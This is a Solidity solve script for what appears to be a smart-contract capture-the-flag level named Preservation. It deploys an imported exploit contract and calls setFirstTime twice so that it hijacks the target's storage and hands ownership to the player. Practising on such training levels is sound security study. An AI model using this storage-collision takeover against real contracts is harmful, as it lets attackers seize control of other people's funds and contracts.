// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IPreservation.sol";
import "../src/exploits/PreservationExploit.sol";

contract SolveLevel16 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x725595BA16E76ED1F6cC1e1b65A88365cC494824;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IPreservation instance = IPreservation(payable(instanceAddress));
        PreservationExploit exploit = new PreservationExploit();

        instance.setFirstTime(uint256(uint160(address(exploit))));
        instance.setFirstTime(uint256(uint160(player)));
    }
}
